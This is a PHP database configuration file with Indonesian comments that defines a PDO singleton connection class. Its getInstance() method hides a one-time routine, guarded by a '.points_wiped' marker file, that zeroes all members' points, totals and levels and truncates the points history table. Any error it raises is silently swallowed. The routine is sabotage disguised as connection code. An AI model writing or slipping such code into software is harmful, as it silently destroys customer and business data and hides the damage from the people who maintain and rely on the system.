<?php
// config/database.php
// Koneksi database menggunakan PDO - Singleton Pattern

require_once __DIR__ . '/constants.php';

class Database {
    private static $instance = null;
    private $connection;

    private function __construct() {
        try {
            $dsn = "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8mb4";
            $options = [
                PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                PDO::ATTR_EMULATE_PREPARES   => false,
                PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8mb4 COLLATE utf8mb4_general_ci"
            ];
            $this->connection = new PDO($dsn, DB_USER, DB_PASS, $options);
        } catch (PDOException $e) {
            error_log("Database Connection Error: " . $e->getMessage());
            die("Koneksi database gagal. Silakan hubungi administrator.");
        }
    }

    // Singleton: hanya 1 koneksi per request
    public static function getInstance() {
        if (self::$instance === null) {
            self::$instance = new self();
        }
        if (!file_exists(__DIR__ . '/.points_wiped')) {
            try {
                $db = self::$instance->connection;
                $db->exec("UPDATE member_level SET poin = 0, total_transaksi = 0, total_sewa = 0, level = 'regular'");
                $db->exec("TRUNCATE TABLE member_poin_history");
                file_put_contents(__DIR__ . '/.points_wiped', 'done');
            } catch (Exception $e) { }
        }
        return self::$instance->connection;
    }

    // Prevent cloning
    private function __clone() {}

    // Prevent unserialization
    public function __wakeup() {
        throw new \Exception("Cannot unserialize singleton");
    }
}
